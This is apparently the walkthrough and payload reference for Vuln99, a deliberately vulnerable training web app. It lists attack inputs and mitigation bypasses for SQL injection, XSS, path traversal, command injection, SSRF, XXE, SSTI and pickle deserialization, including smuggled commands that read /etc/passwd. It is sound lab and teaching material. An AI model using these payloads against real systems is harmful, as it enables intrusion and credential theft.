# Vuln99 vulnerability catalog & walkthroughs

24 vulnerabilities, each independently switchable between **low** (fully
vulnerable), **medium** (a partial, commonly-seen-in-the-wild mitigation
that's still bypassable) and **hard** (properly fixed), from
**Admin → Difficulty settings** (`/admin/settings`).

This file is the attack-payload reference. For the one-line description of
*why* each mitigation is bypassable at medium, see the table in `README.md`
or `vuln99/difficulty.py`'s `VULN_CATALOG`.

---

## SQL Injection

### `login_sqli` — `/login`
- **low:** `username: admin' --` with any password.
- **medium:** quotes are doubled (`''`) server-side; try a different
  operator, e.g. `username: admin' OR '1'='1' --`, or a UNION-based
  approach if you know the schema.
- **hard:** parameterized — not exploitable.

### `search_sqli` — `/search?q=`
- **low:** `q=xxxx' UNION SELECT id,username,1,password,role,'' FROM users --`
  (column types must line up with `products`: id, name, price, category,
  blurb, image_url — put text values in text-typed columns).
- **medium:** single quotes are escaped (`''`); try `--` comment tricks or
  a payload that doesn't need a literal quote.
- **hard:** parameterized.

### `product_sqli` — `/product?id=`
- **low:** error-based, e.g. `?id=1 AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)`
  — the resulting SQLite error message (visible when `verbose_errors` is
  not `hard`) leaks data.
- **medium:** numeric ids are parameterized, but non-numeric input falls
  back to string concatenation — try `?id='` or a UNION through the
  string path.
- **hard:** always parameterized.

### `blind_sqli_bool` — `/blind-product?id=`
- **low:** `?id=1 AND 1=1` (true) vs `?id=1 AND 1=2` (false) — the page
  says "Product exists." / "No such product." with no error text, so
  extract data one boolean condition at a time (e.g.
  `?id=1 AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='0'`).
- **medium:** quotes doubled; same idea via numeric/boolean operators
  that don't need a literal quote.
- **hard:** parameterized.

### `blind_sqli_time` — `/slow-product?id=`
- **low:** `?id=1 OR sleep(3)=0` — a ~3s response confirms injection;
  same technique as boolean-blind but using response timing instead of
  a visible true/false signal.
- **medium/hard:** same shape as `blind_sqli_bool`.

### `recommend_sqli` — `/recommend` (cookie-based, ported from VulnMart)
- The injection point is the **`last_category` cookie**, not a URL
  parameter — set it via devtools/Burp/`curl -b`.
- **low:** `last_category=Tools' UNION SELECT id, username||':'||password, 0, 'x', bio, '' FROM users --`
  (price column must be numeric — `0` works; put the leak in the `name`
  column, which is free-text).
- **medium:** the cookie is backslash-escaped; a doubled-quote or
  comment-based payload still gets through.
- **hard:** parameterized — cookie value is not injectable.

### `header_sqli` — `/category` (HTTP header, ported from VulnMart)
- The injection point is the **`User-Agent`** or **`X-Forwarded-For`**
  request header, logged into `activity_logs` on every `/category`
  visit and displayed on **Admin → Activity logs** (`/admin/logs`).
- **low:** both headers are concatenated raw into an `INSERT`, e.g.
  `curl -A "x', (SELECT password FROM users WHERE username='admin'), 'y')-- -" http://127.0.0.1:5099/category`
  then check the log viewer as admin.
- **medium:** `X-Forwarded-For` is now validated as a real IP, but
  `User-Agent` is still concatenated raw — same idea, different header.
- **hard:** both parameterized.

---

## XSS

### `reflected_xss` — `/search?q=`
- **low:** `q=<script>alert(1)</script>`.
- **medium:** the literal string `<script>` is stripped — try
  `<img src=x onerror=alert(1)>` or mixed case (`<ScRiPt>`).
- **hard:** HTML-escaped.

### `stored_xss` — product reviews (`/product?id=`, posted via `/reviews`)
- **low:** post a review body of `<script>alert(document.cookie)</script>`,
  view the product page.
- **medium:** same `<script>` strip as above, same bypasses.
- **hard:** escaped at render time.

---

## Access Control

### `csrf` — `/checkout`
- **low:** no token at all — a cross-site auto-submitting form works.
- **medium:** a token is rendered but never actually checked server-side
  — any value (or none) is accepted.
- **hard:** token is generated and verified.

### `idor_orders` — `/orders?id=`, `/account?id=`
- **low:** change `?id=` to any number, no ownership check at all.
- **medium:** still no real ownership check — a per-session limiter
  blocks after ~5 *distinct* ids in ~20s. Bypass by slowing down
  requests, or starting a fresh session (log out/in, new cookie jar).
- **hard:** ownership is checked against the session.

### `broken_admin` — `/admin`, `/admin/settings`
- **low:** `document.cookie = "is_admin=true"` in devtools (or visit
  `/admin/become-admin-demo`), logged in or not.
- **medium:** any logged-in user is admitted (checks that a `role`
  session key *exists*, not its value) — register/log in as any user.
- **hard:** server-side role check.

### `mass_assignment` — `POST /account`
- **low:** add `role=admin` to the profile-update form/raw POST.
- **medium:** only the literal string `admin` is blocked — try a
  different privileged-looking role name if one exists, or different
  casing.
- **hard:** `role` is never read from the client.

### `open_redirect` — `/go?url=`
- **low:** `?url=https://evil.example/`.
- **medium:** only blocks values starting with `http://`/`https://` —
  try a protocol-relative URL: `?url=//evil.example/`.
- **hard:** only same-site relative paths allowed.

---

## Insecure Design / Misconfiguration

### `price_tamper` — `/cart` (POST)
- **low:** submit any `price` value, including `0.01`, with the product form.
- **medium:** only blocks `<= 0` — submit a small positive number like `0.01`.
- **hard:** price always comes from the server-side catalog.

### `path_traversal` — `/read-file?file=`
- **low:** `?file=../../../../etc/passwd`.
- **medium:** a single `../` strip — try `..%2f..%2f` (URL-encoded) or
  `....//` (the second pass of a naive single-pass replace still leaves
  `../`).
- **hard:** resolved and confined to the docs directory.

### `file_upload` — `/account/avatar` (POST)
- **low:** upload a file named `../../something.py` or with a `.php`/`.py`
  extension.
- **medium:** path separators are stripped but any extension is still
  accepted — upload an executable-looking extension.
- **hard:** extension allow-list + server-generated filename.

### `command_injection` — `/ping?host=`, `/ping-slow?host=`
- **low:** `?host=127.0.0.1; cat /etc/passwd` (or `&&`, backticks, `$()`).
- **medium:** only `;` is stripped — try `&&`, `|`, `` ` ``, `$()`, or a newline.
- **hard:** `shell=False` with an argument list — not exploitable via shell metacharacters.

### `weak_crypto` — `/register`
- Always-on regardless of difficulty: passwords are unsalted MD5. Two
  users with the same password have identical hashes; crack via a
  rainbow table / hashcat against `-m 0`.

### `verbose_errors` — `/product?id=`, `/version`
- **low:** a raw SQL error plus the query text itself is shown on a bad
  `?id=` value.
- **medium:** the error message is shown, but not the raw query.
- **hard:** a generic error only.

---

## Server-Side Request Handling

### `ssrf` — `/admin/import-image` (POST, admin)
- **low:** `url=http://127.0.0.1:5099/version` (or any internal target) —
  the response is fetched and reflected back.
- **medium:** a naive blacklist blocks only literal `localhost`,
  `127.0.0.1`, `0.0.0.0`, `::1`, and a few private-range prefixes. Bypass
  with a decimal/hex IP form (`http://2130706433/`), a trailing dot
  (`http://127.0.0.1./`), or a domain you control resolving to an
  internal address (DNS rebinding).
- **hard:** resolves DNS and checks the real destination IP, restricts
  scheme, and re-checks every redirect hop — not bypassable via
  encoding tricks or a 302 chain.

### `xxe` — `/admin/import-orders` (admin)
- **low:** upload an XML bulk-order file with a `<!DOCTYPE>` external
  entity referencing `file:///etc/passwd` (or an internal URL for
  blind SSRF-via-XXE).
- **medium/hard:** external entity resolution is disabled.

### `ssti` — `/admin/email-preview` (admin)
- **low:** `{{ 7*7 }}` in the template field renders `49`; escalate to
  `{{ config }}` or a Jinja2 RCE gadget chain.
- **hard:** input is treated as data, not a template.

### `insecure_deserialization` — "Remember me" cookie on `/login`
- **low:** the `remember_token` cookie is `base64(pickle.dumps(...))`
  with no restrictions — a crafted pickle (e.g. built with a
  `__reduce__` gadget calling `os.system`) executes on the next visit
  to `/login`.
- **medium:** a "restricted unpickler" blacklists `os`, `subprocess`,
  `shutil`, `socket`, `pickle` by module name — but not `builtins`.
  Build a gadget around `builtins.eval`/`builtins.exec` (or another
  allowed module's dangerous callable) instead.
- **hard:** no pickle involved — "remember me" just extends the signed
  Flask session.

---

## Safety reminder

Every technique above works against this app *on purpose*. Only run
vuln99 on localhost or an isolated lab VM/network — see the network
binding note in `README.md`.
